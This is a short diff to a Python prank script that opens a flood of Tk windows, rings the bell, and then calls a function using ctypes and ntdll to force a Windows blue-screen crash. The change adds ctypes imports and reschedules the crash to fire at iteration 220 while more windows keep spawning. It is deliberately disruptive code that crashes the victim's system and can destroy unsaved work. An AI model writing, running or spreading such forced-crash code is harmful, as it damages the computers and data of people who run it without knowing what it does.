@@ -3,6 +3,12 @@
 # this will likely be created into a seperate, larger project
 
 import ctypes
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
 
 def bsod():
     ntdll = ctypes.windll.ntdll
@@ -51,13 +57,14 @@ def throwawayroot():
     
     Tk.update(toplevel)
 
-for i in range(0, 220):
+for i in range(0, 230):
     throwawayroot()
     if i/10 == int(i/10):
         toplevel.bell()
+    if i == 220:
+        bsod() # bsod is delayed so 10 more windows will open in meantime
     time.sleep(0.01)
 
-bsod()
 
 
 
